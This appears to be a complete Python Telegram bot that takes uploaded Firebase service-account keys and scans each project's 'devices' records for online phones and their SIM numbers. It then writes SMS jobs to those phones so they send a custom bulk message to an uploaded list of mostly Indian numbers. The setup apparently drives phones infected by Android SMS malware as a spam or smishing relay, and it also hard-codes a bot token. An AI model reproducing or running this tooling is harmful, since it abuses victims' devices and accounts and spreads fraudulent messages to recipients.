#!/usr/bin/env python3
"""
spinach Multi-User Automatic SMS Bot
Flow:
  1. User uploads Firebase service-account JSON list (txt / zip of .json)
  2. Bot scans every project → finds online devices
  3. User uploads recipient numbers (.txt)
  4. User sends custom SMS text
  5. Bot distributes: max 5 SMS per online device, round-robin across devices/projects
  6. Live progress bar → auto-stop when all recipients done
"""

import os
import re
import json
import time
import uuid
import tempfile
import threading
import logging
from pathlib import Path
from typing import Any, Optional
from collections import defaultdict
from dataclasses import dataclass, field

import telebot
from telebot import types
import firebase_admin
from firebase_admin import credentials, db as firebase_db

# ── CONFIG ────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8763280422:AAFwSQvwIgSrgqBsGJTZmjGFe0kKlvHVD_o")
ALLOWED_USERS: set[int] = set()  # empty = everyone; fill with chat ids for prod
SMS_PER_DEVICE = 5
ONLINE_WINDOW_MS = 5 * 60 * 1000  # 5 min lastSeen = online
JOB_DELAY_SEC = 1.2               # pause between jobs (carrier friendly)
PROGRESS_EDIT_EVERY = 3           # edit progress message every N sends

# ── LOGGING ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("multi-sms-bot")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ── SESSION STATE (per Telegram chat) ─────────────────────────────────────
@dataclass
class FirebaseProject:
    name: str
    app: Any
    db_url: str
    devices: list[dict] = field(default_factory=list)  # {id, online, lastSeen, phone, ...}

@dataclass
class Session:
    chat_id: int
    step: str = "idle"  # idle | await_firebase | await_numbers | await_message | running | done
    projects: list[FirebaseProject] = field(default_factory=list)
    online_devices: list[dict] = field(default_factory=list)  # flat list of {project_idx, device_id, ...}
    numbers: list[str] = field(default_factory=list)
    message: str = ""
    sent: int = 0
    failed: int = 0
    total: int = 0
    progress_msg_id: Optional[int] = None
    cancel: bool = False
    lock: threading.Lock = field(default_factory=threading.Lock)

sessions: dict[int, Session] = {}
sessions_lock = threading.Lock()

def get_session(chat_id: int) -> Session:
    with sessions_lock:
        if chat_id not in sessions:
            sessions[chat_id] = Session(chat_id=chat_id)
        return sessions[chat_id]

def reset_session(chat_id: int):
    with sessions_lock:
        old = sessions.get(chat_id)
        if old:
            old.cancel = True
            # delete named firebase apps so we can re-init cleanly
            for p in old.projects:
                try:
                    firebase_admin.delete_app(p.app)
                except Exception:
                    pass
        sessions[chat_id] = Session(chat_id=chat_id)

# ── ACCESS ────────────────────────────────────────────────────────────────
def is_allowed(uid: int) -> bool:
    if not ALLOWED_USERS:
        return True
    return uid in ALLOWED_USERS

# ── ONLINE DETECTION (mirrors NEXUS panel) ────────────────────────────────
def parse_timestamp(val) -> Optional[int]:
    if val is None:
        return None
    try:
        if isinstance(val, (int, float)):
            t = int(val)
            # seconds → ms
            if t < 1_000_000_000_000:
                t *= 1000
            return t
        if isinstance(val, str):
            s = val.strip()
            if s.isdigit():
                t = int(s)
                if t < 1_000_000_000_000:
                    t *= 1000
                return t
            # ISO-ish
            from datetime import datetime
            for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S"):
                try:
                    return int(datetime.strptime(s[:26], fmt).timestamp() * 1000)
                except Exception:
                    pass
    except Exception:
        pass
    return None

def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
    """Return (online, lastSeen_ms). Same heuristics as NEXUS-NeoBrutal."""
    if not isinstance(node, dict):
        return False, None

    info = node.get("info") if isinstance(node.get("info"), dict) else {}
    st = node.get("status") if isinstance(node.get("status"), dict) else {}
    if not st and isinstance(info.get("status"), dict):
        st = info["status"]

    last_seen = parse_timestamp(
        node.get("lastSeen") or node.get("last_seen") or node.get("lastOnline")
        or node.get("last_online") or node.get("lastActive") or node.get("last_active")
        or node.get("joined") or node.get("updatedAt") or node.get("updated_at")
        or node.get("timestamp") or node.get("time") or node.get("dateTime")
        or node.get("lastMessageTime")
        or info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline")
        or info.get("joined") or st.get("lastSeen")
    )

    online = False
    raw = node.get("status") if not isinstance(node.get("status"), dict) else None
    if raw is None:
        raw = info.get("status") if not isinstance(info.get("status"), dict) else None
    if raw is None:
        raw = st.get("status") if isinstance(st, dict) else None
    if raw is None:
        raw = node.get("state") or info.get("state")

    if raw is False or raw == 0 or raw is None:
        online = False
    elif isinstance(raw, str):
        sl = raw.lower().strip()
        online = sl not in ("false", "0", "no", "offline", "inactive", "disconnected", "dead", "gone") and len(sl) > 0
    elif isinstance(raw, dict):
        online = bool(
            raw.get("online") or raw.get("isOnline") or raw.get("connected")
            or raw.get("active") or raw.get("alive")
        )
    else:
        online = bool(raw)

    if not online and (node.get("online") is True or info.get("online") is True
                       or node.get("isOnline") is True or info.get("isOnline") is True):
        online = True
    if not online and isinstance(node.get("connected"), bool):
        online = node["connected"]
    if not online and isinstance(info.get("connected"), bool):
        online = info["connected"]
    if not online and (node.get("alive") is True or info.get("alive") is True or node.get("heartbeat") is True):
        online = True
    # lastSeen within window
    if not online and last_seen and (int(time.time() * 1000) - last_seen) < ONLINE_WINDOW_MS:
        online = True

    return online, last_seen

def extract_phone(node: dict) -> str:
    info = node.get("info") if isinstance(node.get("info"), dict) else {}
    candidates = [
        node.get("mobNo"), info.get("mobNo"), node.get("phone"), node.get("phoneNumber"),
        info.get("phone"), node.get("number"), info.get("phoneNumber"),
        node.get("msisdn"), info.get("msisdn"),
    ]
    for c in candidates:
        if c is None:
            continue
        dig = re.sub(r"[^\d+]", "", str(c))
        if len(dig) >= 10:
            return dig
    sims = node.get("sims") or info.get("sims") or []
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                p = s.get("phoneNumber") or s.get("number")
                if p and str(p) != "Unknown":
                    dig = re.sub(r"[^\d+]", "", str(p))
                    if len(dig) >= 10:
                        return dig
    return "—"

# ── FIREBASE MULTI-PROJECT ────────────────────────────────────────────────
def _unique_app_name(base: str) -> str:
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", base)[:40]
    return f"{safe}_{uuid.uuid4().hex[:8]}"

def load_service_account(data: dict) -> Optional[tuple[Any, str]]:
    """Initialize a named Firebase app from service-account dict. Returns (app, db_url) or None."""
    try:
        project_id = data.get("project_id") or data.get("projectId") or "unknown"
        # Guess RTDB URL if not provided
        db_url = data.get("databaseURL") or data.get("database_url")
        if not db_url:
            # common patterns
            db_url = f"https://{project_id}-default-rtdb.firebaseio.com"
            # also try asia-southeast1 etc later if needed

        name = _unique_app_name(project_id)
        cred = credentials.Certificate(data)
        app = firebase_admin.initialize_app(cred, {"databaseURL": db_url}, name=name)
        return app, db_url
    except Exception as e:
        log.warning("Failed to init project: %s", e)
        return None

def scan_devices(app, db_url: str) -> list[dict]:
    """Read devices/ from this project and return list of device dicts with online flag."""
    out = []
    try:
        ref = firebase_db.reference("devices", app=app)
        snap = ref.get()
        if not snap or not isinstance(snap, dict):
            return out
        for did, node in snap.items():
            if not isinstance(node, dict):
                continue
            online, last_seen = is_device_online(node)
            phone = extract_phone(node)
            out.append({
                "id": did,
                "online": online,
                "lastSeen": last_seen,
                "phone": phone,
                "raw": node,
            })
    except Exception as e:
        log.warning("scan devices failed for %s: %s", db_url, e)
    return out

def push_sms_job(app, device_id: str, to: str, body: str, chat_id: int) -> str:
    job_id = str(uuid.uuid4())[:12]
    job = {
        "to": to,
        "body": body,
        "status": "pending",
        "createdAt": int(time.time() * 1000),
        "requestedBy": chat_id,
        "sim": 1,
    }
    path = f"devices/{device_id}/sendSms/{job_id}"
    firebase_db.reference(path, app=app).set(job)
    return job_id

# ── FILE PARSING ──────────────────────────────────────────────────────────
def parse_firebase_files(file_bytes: bytes, filename: str) -> list[dict]:
    """Accept single .json, .txt (one json or multiple jsons), or list of paths."""
    results = []
    name = (filename or "").lower()

    # single JSON object
    try:
        text = file_bytes.decode("utf-8", errors="ignore").strip()
        if not text:
            return results
        # try whole file as one JSON
        if text.startswith("{"):
            obj = json.loads(text)
            if "type" in obj or "private_key" in obj or "project_id" in obj:
                results.append(obj)
                return results
        # try line-delimited / multiple objects
        # also support array of service accounts
        if text.startswith("["):
            arr = json.loads(text)
            if isinstance(arr, list):
                for item in arr:
                    if isinstance(item, dict) and ("private_key" in item or "project_id" in item):
                        results.append(item)
                return results
    except Exception:
        pass

    # fallback: find all JSON objects with private_key in the text
    try:
        text = file_bytes.decode("utf-8", errors="ignore")
        # split by common separators
        chunks = re.split(r"\n\s*\n|\n---+\n", text)
        for chunk in chunks:
            chunk = chunk.strip()
            if not chunk.startswith("{"):
                continue
            try:
                obj = json.loads(chunk)
                if isinstance(obj, dict) and ("private_key" in obj or "project_id" in obj):
                    results.append(obj)
            except Exception:
                continue
        # last resort: regex extract { ... }
        if not results:
            for m in re.finditer(r"\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}", text, re.DOTALL):
                try:
                    obj = json.loads(m.group(0))
                    if isinstance(obj, dict) and ("private_key" in obj or "project_id" in obj):
                        results.append(obj)
                except Exception:
                    continue
    except Exception as e:
        log.warning("parse_firebase_files: %s", e)
    return results

def parse_numbers(text: str) -> list[str]:
    nums = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # extract phone-like tokens
        for tok in re.split(r"[\s,;|]+", line):
            dig = re.sub(r"[^\d+]", "", tok)
            if len(dig) < 10:
                continue
            # Indian normalize
            if dig.startswith("0") and len(dig) == 11:
                dig = "+91" + dig[1:]
            elif dig.startswith("91") and len(dig) == 12:
                dig = "+" + dig
            elif len(dig) == 10 and dig[0] in "6789":
                dig = "+91" + dig
            elif not dig.startswith("+") and len(dig) >= 10:
                dig = "+" + dig
            if dig not in seen:
                seen.add(dig)
                nums.append(dig)
    return nums

# ── PROGRESS BAR ──────────────────────────────────────────────────────────
def progress_bar(sent: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = int(width * sent / total)
    filled = min(filled, width)
    return "█" * filled + "░" * (width - filled)

def format_progress(s: Session) -> str:
    left = max(0, s.total - s.sent - s.failed)
    pct = int(100 * (s.sent + s.failed) / s.total) if s.total else 0
    bar = progress_bar(s.sent + s.failed, s.total)
    status = "RUNNING" if s.step == "running" else ("DONE" if s.step == "done" else s.step.upper())
    return (
        f"<b>SMS Campaign — {status}</b>\n\n"
        f"<code>[{bar}]</code> {pct}%\n\n"
        f"✅ Sent: <b>{s.sent}</b>\n"
        f"❌ Failed: <b>{s.failed}</b>\n"
        f"⏳ Left: <b>{left}</b>\n"
        f"📦 Total: <b>{s.total}</b>\n"
        f"📱 Online devices: <b>{len(s.online_devices)}</b>\n"
        f"🔥 Projects: <b>{len(s.projects)}</b>"
    )

# ── WORKER ────────────────────────────────────────────────────────────────
def run_campaign(chat_id: int):
    s = get_session(chat_id)
    if not s.online_devices or not s.numbers or not s.message:
        bot.send_message(chat_id, "Missing devices / numbers / message. Restart with /start")
        return

    s.step = "running"
    s.sent = 0
    s.failed = 0
    s.total = len(s.numbers)
    s.cancel = False

    # distribute: each online device gets batches of SMS_PER_DEVICE
    # round-robin devices, each does up to SMS_PER_DEVICE then next
    devices = list(s.online_devices)
    if not devices:
        bot.send_message(chat_id, "No online devices. Abort.")
        s.step = "idle"
        return

    # build assignment: list of (device_meta, number)
    queue: list[tuple[dict, str]] = []
    device_usage = defaultdict(int)
    di = 0
    for num in s.numbers:
        # find next device that still has capacity
        tried = 0
        while tried < len(devices):
            d = devices[di % len(devices)]
            key = (d["project_idx"], d["id"])
            if device_usage[key] < SMS_PER_DEVICE:
                queue.append((d, num))
                device_usage[key] += 1
                di += 1
                break
            di += 1
            tried += 1
        else:
            # all devices at capacity — still assign round-robin (overflow)
            d = devices[di % len(devices)]
            queue.append((d, num))
            di += 1

    # progress message
    try:
        msg = bot.send_message(chat_id, format_progress(s))
        s.progress_msg_id = msg.message_id
    except Exception:
        s.progress_msg_id = None

    for idx, (dev, number) in enumerate(queue):
        if s.cancel:
            break
        proj = s.projects[dev["project_idx"]]
        try:
            push_sms_job(proj.app, dev["id"], number, s.message, chat_id)
            with s.lock:
                s.sent += 1
            log.info("sent %s via %s/%s", number, proj.name, dev["id"])
        except Exception as e:
            with s.lock:
                s.failed += 1
            log.warning("fail %s: %s", number, e)

        # update progress
        if s.progress_msg_id and ((idx + 1) % PROGRESS_EDIT_EVERY == 0 or idx == len(queue) - 1):
            try:
                bot.edit_message_text(
                    format_progress(s),
                    chat_id,
                    s.progress_msg_id,
                )
            except Exception:
                pass

        time.sleep(JOB_DELAY_SEC)

    s.step = "done"
    try:
        if s.progress_msg_id:
            bot.edit_message_text(format_progress(s), chat_id, s.progress_msg_id)
        bot.send_message(
            chat_id,
            f"<b>Campaign finished</b>\n"
            f"✅ {s.sent} sent · ❌ {s.failed} failed · Total {s.total}\n"
            f"Use /start for a new run."
        )
    except Exception:
        pass

# ── HANDLERS ──────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start", "help"])
def cmd_start(message: types.Message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "Access denied.")
        return
    reset_session(message.chat.id)
    s = get_session(message.chat.id)
    s.step = "await_firebase"
    text = (
        "<b>Multi-User Auto SMS Bot</b>\n\n"
        "Fully automatic pipeline:\n"
        "1️⃣ Upload Firebase credentials (service-account .json or .txt with multiple)\n"
        "2️⃣ Bot scans all projects → lists <b>online</b> devices\n"
        "3️⃣ Upload recipient numbers (.txt)\n"
        "4️⃣ Send custom SMS text\n"
        "5️⃣ Bot sends <b>5 SMS per online device</b>, then switches device\n"
        "6️⃣ Live progress bar → stops when all done\n\n"
        "<b>Step 1 — send Firebase file now</b>\n"
        "• One or more serviceAccountKey.json\n"
        "• Or a .txt containing multiple JSON objects\n"
        "• Or a .json array of service accounts\n\n"
        "Commands: /cancel · /status · /start"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=["cancel"])
def cmd_cancel(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    s.cancel = True
    s.step = "idle"
    bot.reply_to(message, "Cancelled. /start to begin again.")

@bot.message_handler(commands=["status"])
def cmd_status(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    bot.reply_to(message, format_progress(s) if s.total else f"Step: <code>{s.step}</code>\nOnline devices: {len(s.online_devices)}\nNumbers loaded: {len(s.numbers)}")

@bot.message_handler(content_types=["document"])
def on_document(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    doc = message.document
    fname = (doc.file_name or "").lower()

    # download
    try:
        file_info = bot.get_file(doc.file_id)
        raw = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.reply_to(message, f"Download failed: {e}")
        return

    # ── Step 1: Firebase credentials ──────────────────────────────────
    if s.step == "await_firebase":
        accounts = parse_firebase_files(raw, fname)
        if not accounts:
            bot.reply_to(
                message,
                "No valid service-account JSON found.\n"
                "Send a .json (type: service_account) or .txt with one/more JSONs."
            )
            return

        bot.reply_to(message, f"Found <b>{len(accounts)}</b> credential(s). Scanning projects…")
        projects: list[FirebaseProject] = []
        all_online: list[dict] = []

        for i, acc in enumerate(accounts):
            res = load_service_account(acc)
            if not res:
                continue
            app, db_url = res
            pid = acc.get("project_id") or acc.get("projectId") or f"proj{i}"
            devices = scan_devices(app, db_url)
            online = [d for d in devices if d["online"]]
            proj = FirebaseProject(name=str(pid), app=app, db_url=db_url, devices=devices)
            projects.append(proj)
            for d in online:
                all_online.append({
                    "project_idx": len(projects) - 1,
                    "id": d["id"],
                    "phone": d["phone"],
                    "lastSeen": d["lastSeen"],
                    "project": str(pid),
                })

        s.projects = projects
        s.online_devices = all_online

        if not projects:
            bot.reply_to(message, "Could not initialize any Firebase project. Check credentials + databaseURL.")
            return

        # summary
        lines = [f"<b>Scan complete</b> — {len(projects)} project(s)\n"]
        for p in projects:
            on = sum(1 for d in p.devices if d["online"])
            lines.append(f"• <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
        lines.append(f"\n📱 <b>Total online devices: {len(all_online)}</b>")
        if all_online:
            for d in all_online[:15]:
                lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
            if len(all_online) > 15:
                lines.append(f"  … +{len(all_online)-15} more")
            lines.append("\n<b>Step 2 — send recipient numbers .txt now</b>")
            s.step = "await_numbers"
        else:
            lines.append("\n⚠️ No online devices found. Check device presence / lastSeen.")
            s.step = "await_firebase"
        bot.reply_to(message, "\n".join(lines))
        return

    # ── Step 2: numbers file ──────────────────────────────────────────
    if s.step == "await_numbers":
        try:
            text = raw.decode("utf-8", errors="ignore")
        except Exception:
            bot.reply_to(message, "Could not read file as text.")
            return
        nums = parse_numbers(text)
        if not nums:
            bot.reply_to(message, "No valid Indian mobile numbers found. Send a .txt with numbers (one per line or comma-separated).")
            return
        s.numbers = nums
        s.step = "await_message"
        bot.reply_to(
            message,
            f"Loaded <b>{len(nums)}</b> unique numbers.\n\n"
            f"<b>Step 3 — send the custom SMS text now</b>\n"
            f"(plain message, max ~1000 chars)\n\n"
            f"Example: reply with the exact text you want every recipient to receive."
        )
        return

    bot.reply_to(message, f"Unexpected file at step <code>{s.step}</code>. Use /start.")

@bot.message_handler(func=lambda m: True, content_types=["text"])
def on_text(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    if message.text and message.text.startswith("/"):
        return  # other commands handled elsewhere

    s = get_session(message.chat.id)

    # ── Step 3: custom SMS body ───────────────────────────────────────
    if s.step == "await_message":
        body = (message.text or "").strip()
        if not body:
            bot.reply_to(message, "Empty message. Send the SMS text.")
            return
        if len(body) > 1000:
            bot.reply_to(message, "Too long (max 1000). Shorten and resend.")
            return
        s.message = body

        # confirm + start
        max_capacity = len(s.online_devices) * SMS_PER_DEVICE
        note = ""
        if len(s.numbers) > max_capacity:
            note = (
                f"\n⚠️ You have {len(s.numbers)} numbers but only "
                f"{len(s.online_devices)}×{SMS_PER_DEVICE}={max_capacity} slots. "
                f"Extra numbers will still be sent (round-robin beyond limit)."
            )
        confirm = (
            f"<b>Ready to launch</b>\n\n"
            f"📱 Online devices: <b>{len(s.online_devices)}</b>\n"
            f"👥 Recipients: <b>{len(s.numbers)}</b>\n"
            f"📝 Message: <code>{body[:120]}{'…' if len(body)>120 else ''}</code>\n"
            f"🔁 Rule: {SMS_PER_DEVICE} SMS per device then switch\n"
            f"{note}\n\n"
            f"Starting in 2s… /cancel to abort"
        )
        bot.reply_to(message, confirm)
        t = threading.Thread(target=run_campaign, args=(message.chat.id,), daemon=True)
        t.start()
        return

    if s.step == "running":
        bot.reply_to(message, "Campaign running. /status or /cancel")
        return

    bot.reply_to(message, "Use /start to begin the multi-user SMS pipeline.")

# ── MAIN ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("Starting multi-user auto SMS bot…")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
